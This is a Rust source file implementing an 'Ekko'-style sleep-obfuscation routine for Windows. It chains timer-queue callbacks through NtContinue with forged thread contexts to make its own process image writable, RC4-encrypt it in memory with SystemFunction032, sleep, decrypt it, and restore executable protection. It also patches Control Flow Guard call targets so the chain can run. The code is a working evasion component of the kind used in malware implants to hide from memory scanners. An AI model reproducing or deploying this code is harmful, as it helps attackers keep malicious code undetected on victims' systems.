
use std::{
    ffi::c_void,
    ptr::{null, null_mut},
};
use windows_sys::Win32::{
    Foundation::{GetLastError, HANDLE},
    System::{
        Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Memory::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE, SetProcessValidCallTargets, CFG_CALL_TARGET_INFO, MEMORY_BASIC_INFORMATION},
        SystemServices::IMAGE_DOS_HEADER,
        Threading::{
            CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue,
            WaitForSingleObject, WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD,
        }
    },
    UI::{WindowsAndMessaging::MessageBoxA},
};
use backtrace::Backtrace;

#[repr(C)]
struct UString {
    length: u32,
    maximum_length: u32,
    buffer: *mut u16,
}

#[derive(Clone, Copy)]
#[repr(align(16))]
struct ProperlyAlignedContext(pub CONTEXT);

impl core::ops::Deref for ProperlyAlignedContext {
    type Target = CONTEXT;
    fn deref(&self) -> &CONTEXT {
        &self.0
    }
}

impl core::ops::DerefMut for ProperlyAlignedContext {
    fn deref_mut(&mut self) -> &mut CONTEXT {
        &mut self.0
    }
}

fn cfg_patch(function: isize, module: isize){
    let mut Cfg: CFG_CALL_TARGET_INFO = unsafe { std::mem::zeroed() };
    let dos_header = module as *mut IMAGE_DOS_HEADER;
    let nt_headers = unsafe { (dos_header as u64 + (*dos_header).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64 };
    let image_size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage };
    let mut reg_size = (image_size + 0x1000 - 1) & !!(0x1000 - 1);
    Cfg.Flags = 1;
    Cfg.Offset = (function - module) as usize;
    unsafe {SetProcessValidCallTargets(0xFFFFFFFF as HANDLE, module as *const c_void, reg_size as usize, 1,  &mut Cfg)};
}

pub fn ekko(sleep_time: u64, key_buf: &mut Vec<u8>) {
    let mut h_new_timer: HANDLE = 0;
    let mut old_protect: u32 = 0;

    let h_event = unsafe { CreateEventW(null(), 0, 0, null()) };

    if h_event == 0 {
        panic!("[!] CreateEventW failed with error: {}", unsafe { GetLastError() });
    }

    let EvntStart = unsafe { CreateEventW(null(), 0, 0, null()) };
    let EvntDelay = unsafe { CreateEventW(null(), 0, 0, null()) };

    let h_timer_queue = unsafe { CreateTimerQueue() };

    if h_timer_queue == 0 {
        panic!("[!] CreateTimerQueue failed with error: {}", unsafe { GetLastError() });
    }



    let rtl_capture_context = unsafe { GetProcAddress(LoadLibraryA("ntdll\0".as_ptr()), "RtlCaptureContext\0".as_ptr()).unwrap() as u64 };
    let rtl_capture_context_ptr = unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(rtl_capture_context) };

    let nt_continue = unsafe { GetProcAddress(GetModuleHandleA("ntdll\0".as_ptr()),"NtContinue\0".as_ptr()).unwrap() as u64 };
    let nt_continue_ptr = unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(nt_continue) };
    let Nt_SignalAndWaitForSingleObject_ptr = unsafe { GetProcAddress(GetModuleHandleA("ntdll\0".as_ptr()),"NtSignalAndWaitForSingleObject\0".as_ptr()).unwrap() as u64 };
    let Nt_SignalAndWaitForSingleObject = unsafe { std::mem::transmute::<_, fn(u32, u32, bool, *mut u16)>(Nt_SignalAndWaitForSingleObject_ptr) };
    let system_function032 = unsafe { GetProcAddress(LoadLibraryA("Advapi32\0".as_ptr()), "SystemFunction032\0".as_ptr()).unwrap() as u64};
    let virtual_protect = unsafe { GetProcAddress(LoadLibraryA("kernel32.dll\0".as_ptr()), "VirtualProtect\0".as_ptr()).unwrap() as u64 };
    let wait_for_single_object = unsafe { GetProcAddress(LoadLibraryA("kernel32.dll\0".as_ptr()), "WaitForSingleObject\0".as_ptr()).unwrap() as u64 };
    let wait_for_single_objectex = unsafe { GetProcAddress(LoadLibraryA("kernel32.dll\0".as_ptr()), "WaitForSingleObjectEx\0".as_ptr()).unwrap() as u64 };
    let set_event = unsafe { GetProcAddress(LoadLibraryA("kernel32.dll\0".as_ptr()), "SetEvent\0".as_ptr()).unwrap() as u64 };

    let VirtualQuery_ptr = unsafe { GetProcAddress(GetModuleHandleA("kernel32\0".as_ptr()),"VirtualQuery\0".as_ptr()).unwrap() as u64 };
    let VirtualQuery = unsafe { std::mem::transmute::<_, fn(*const c_void, *mut MEMORY_BASIC_INFORMATION, u32)>(VirtualQuery_ptr) };

    unsafe{
        cfg_patch(nt_continue as isize, GetModuleHandleA("ntdll\0".as_ptr()));
        cfg_patch(virtual_protect as isize, GetModuleHandleA("ntdll\0".as_ptr()));
        cfg_patch(wait_for_single_objectex as isize, GetModuleHandleA("kernel32\0".as_ptr()));
    }

    let backtrace = Backtrace::new();
    let mut calling_address: *const c_void = null_mut();
    if let Some(frame) = backtrace.frames().get(1) {
        if let Some(ip) = unsafe{frame.ip().as_ref()} {
            calling_address = ip;
        }
    }
    let mut mem_info = unsafe { std::mem::zeroed::<MEMORY_BASIC_INFORMATION>() };
    VirtualQuery(calling_address as *const c_void, &mut mem_info, std::mem::size_of_val(&mem_info) as u32);
    
    let image_base = mem_info.AllocationBase;
    let image_size = 276992;

    let key = UString {
        length: key_buf.len() as u32,
        maximum_length: key_buf.len() as u32,
        buffer: key_buf.as_mut_ptr() as _,
    };

    let mut data = UString {
        length: image_size as u32,
        maximum_length: image_size as u32,
        buffer: image_base as _,
    };

    let ctx_thread = unsafe { std::mem::zeroed::<ProperlyAlignedContext>() };

    let result = unsafe { CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, rtl_capture_context_ptr, &ctx_thread as *const _ as *const _, 0, 0, WT_EXECUTEINTIMERTHREAD) };

    if result != 0 {
        unsafe { WaitForSingleObject(h_event, 0x32) };

        let mut rop_prot_rw = ctx_thread;
        let mut rop_mem_enc = ctx_thread;
        let mut rop_delay = ctx_thread;
        let mut rop_mem_dec = ctx_thread;
        let mut rop_prot_rx = ctx_thread;
        let mut rop_set_evt = ctx_thread;
        let mut rop_WaitForSingleObjectEx = ctx_thread;

        rop_WaitForSingleObjectEx.Rsp -= 8;
        rop_WaitForSingleObjectEx.Rip = wait_for_single_objectex as u64;
        rop_WaitForSingleObjectEx.Rcx = EvntStart as *const c_void as u64;
        rop_WaitForSingleObjectEx.Rdx = 0xFFFFFFFF as u64;
        rop_WaitForSingleObjectEx.R8 = false as u64;

        rop_prot_rw.Rsp -= 8;
        rop_prot_rw.Rip = virtual_protect as u64;
        rop_prot_rw.Rcx = image_base as *const c_void as u64;
        rop_prot_rw.Rdx = image_size as u64;
        rop_prot_rw.R8 = PAGE_READWRITE as u64;
        rop_prot_rw.R9 = &mut old_protect as *mut _ as u64;

        rop_mem_enc.Rsp -= 8;
        rop_mem_enc.Rip = system_function032 as u64;
        rop_mem_enc.Rcx = &mut data as *mut _ as u64;
        rop_mem_enc.Rdx = &key as *const _ as u64;

        rop_delay.Rsp -= 8;
        rop_delay.Rip = wait_for_single_object as u64;
        rop_delay.Rcx = -1 as isize as u64;
        rop_delay.Rdx = sleep_time as u64;

        rop_mem_dec.Rsp -= 8;
        rop_mem_dec.Rip = system_function032 as u64;
        rop_mem_dec.Rcx = &mut data as *mut _ as u64;
        rop_mem_dec.Rdx = &key as *const _ as u64;

        rop_prot_rx.Rsp -= 8;
        rop_prot_rx.Rip = virtual_protect as u64;
        rop_prot_rx.Rcx = image_base as *const c_void as u64;
        rop_prot_rx.Rdx = image_size as u64;
        rop_prot_rx.R8 = PAGE_EXECUTE_READWRITE as u64;
        rop_prot_rx.R9 = &mut old_protect as *mut _ as u64;

        rop_set_evt.Rsp -= 8;
        rop_set_evt.Rip = set_event as u64;
        rop_set_evt.Rcx = EvntDelay as u64;

        //println!("[+] Queue timers");
        unsafe 
        {
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_WaitForSingleObjectEx as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD);

            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_prot_rw as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD);
    
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_mem_enc as *const _ as *const _, 200, 0, WT_EXECUTEINTIMERTHREAD);
            
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_delay as *const _ as *const _, 300, 0, WT_EXECUTEINTIMERTHREAD);

            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_mem_dec as *const _ as *const _, 400, 0, WT_EXECUTEINTIMERTHREAD);

            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_prot_rx as *const _ as *const _, 500,0, WT_EXECUTEINTIMERTHREAD);

            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_set_evt as *const _ as *const _,  600, 0, WT_EXECUTEINTIMERTHREAD);
    
            //println!("[+] Wait for hEvent");
            //DebugBreak(); need to patch cfg
            Nt_SignalAndWaitForSingleObject(EvntStart as u32, EvntDelay as u32, false, null_mut());
            //println!("[+] Finished waiting for event");
        }
    }

    unsafe { DeleteTimerQueue(h_timer_queue) };
    //zunsafe{MessageBoxA(0, "test\0".as_ptr(), "test\0".as_ptr(), 0);}
}
